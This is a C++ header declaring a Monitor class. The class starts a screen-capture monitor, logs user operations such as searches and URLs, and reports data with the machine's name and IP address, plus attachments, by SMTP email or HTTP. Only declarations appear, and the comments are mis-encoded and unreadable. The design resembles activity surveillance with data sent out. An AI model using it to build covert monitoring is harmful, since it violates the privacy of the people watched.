#ifndef _Monitor_H_
#define _Monitor_H_

#include <string>

enum OperatorType
{
	OP_Search,
	OP_GetUrl,
	OP_Play,
	OP_Record,
	OP_Favirate
};

class Monitor
{
public:
	Monitor();
	~Monitor();

public:
	int StartScreenCaptureMonitor();
	static DWORD WINAPI ScreenCaptureMonitor(LPVOID lpParam);

public:
	/**
	 * �������
	 * ������
	 *	@op_type	��������
	 *	@subject	��������
	 *	@object		��������
	 */
	int OperatorMonitor(enum OperatorType op_type, const char *subject, const char *object);

public:
	const char* GetComputerNameEx() { return computer_name; }
	const char* GetIpAddressEx() { return ip; }
	// �����ʼ��ķ�ʽ�ϱ���������������з������ƣ��ܿ�Ͳ�����
	int SendMessage(const char *subject, const char *content, const char *attachment_name = NULL, const unsigned char *attachment = NULL, int attachment_len = 0);
	// HTTP�ϱ��ķ�ʽ
	int SendMessageEx(const char *subject, const char *content, const char *attachment_name = NULL, const unsigned char *attachment = NULL, int attachment_len = 0);

private:
	// SMTP������
	std::string mail_host;
	// ������
	std::string mail_sender;
	// ������
	std::string mail_recipient;

	char computer_name[4096];
	char ip[64];
};

#endif//_Monitor_H_
